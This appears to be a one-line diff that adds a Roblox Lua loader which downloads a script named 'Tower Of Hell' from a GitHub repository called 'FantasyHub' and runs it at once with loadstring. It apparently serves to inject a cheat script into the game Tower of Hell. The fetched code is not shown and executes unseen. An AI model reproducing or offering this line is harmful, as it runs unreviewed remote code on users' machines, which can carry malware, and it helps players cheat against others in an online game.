@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SchoolTrash/FantasyHub/main/Tower%20Of%20Hell"))()
